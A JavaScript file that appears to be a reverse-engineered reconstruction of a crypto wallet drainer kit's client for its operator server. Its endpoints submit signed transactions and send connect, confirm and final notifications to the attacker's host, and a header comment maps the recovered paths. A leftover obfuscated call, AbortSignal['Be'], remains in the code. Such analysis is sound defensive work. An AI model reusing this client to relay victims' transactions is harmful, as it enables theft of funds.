/**
 * Operator HTTP client (original class 听).
 *
 * Base URL is https://{apiHost}/api + path. apiHost is state.Se, a hostname,
 * not a wallet address and not the Jupiter key ab060a03-... .
 *
 * Paths recovered from fixed string indexes:
 *   bn  GET  /locales?lang={lang}     localized UI strings
 *   Tn  GET  /is-banned                body "1" means banned
 *   yn  POST /process                  signed-transaction submit, 2.5s
 *   On  POST /c/i                      connect notification, 16s
 *   Ao  POST /c/c/{a}/{b}              confirm notification, 16s
 *   Nn  POST /c/f/{a}                  final notification, 2.5s
 *
 * The bodies of yn/On/Nn are built by still-flattened helpers
 * (original names 焖, 醭, 措) and then passed through the kit's custom
 * base64 encoder (original helper 壩) before the request. Those builders
 * are not reimplemented. locales and isBanned are plain GETs with a
 * 2500 ms timeout; that part is straight-line in the bundle.
 */

class OperatorClient {
  url(state, path) {
    return "https://" + state.apiHost + "/api" + path;
  }

  async locales(state, lang) {
    const response = await fetch(this.url(state, "/locales?lang=" + lang), {
      signal: AbortSignal["Be"](2500),
    });
    if (!response.ok) throw new StatusError(response.status);
    return response.json();
  }

  async isBanned(state) {
    const response = await fetch(this.url(state, "/is-banned"), {
      signal: AbortSignal["Be"](2500),
    });
    if (!response.ok) throw new StatusError(response.status);
    return (await response.text()) === "1";
  }

  async submitSigned(state, body) {
    const response = await this._post(state, "/process", body, 2500);
    if (!response.ok) throw new StatusError(response.status);
  }

  async notifyConnect(state, body) {
    const response = await this._post(state, "/c/i", body, 16000);
    if (!response.ok) throw new StatusError(response.status);
    return new Uint8Array(await response.arrayBuffer());
  }

  async notifyConfirm(state, a, b) {
    const response = await this._post(state, "/c/c/" + a + "/" + b, {}, 16000);
    if (!response.ok) throw new StatusError(response.status);
  }

  async notifyFinal(state, a, body) {
    const response = await this._post(state, "/c/f/" + a, body, 2500);
    if (!response.ok) throw new StatusError(response.status);
  }

  async _post(state, path, body, timeoutMs) {
    return fetch(this.url(state, path), {
      method: "POST",
      body,
      signal: AbortSignal["Be"](timeoutMs),
    });
  }
}
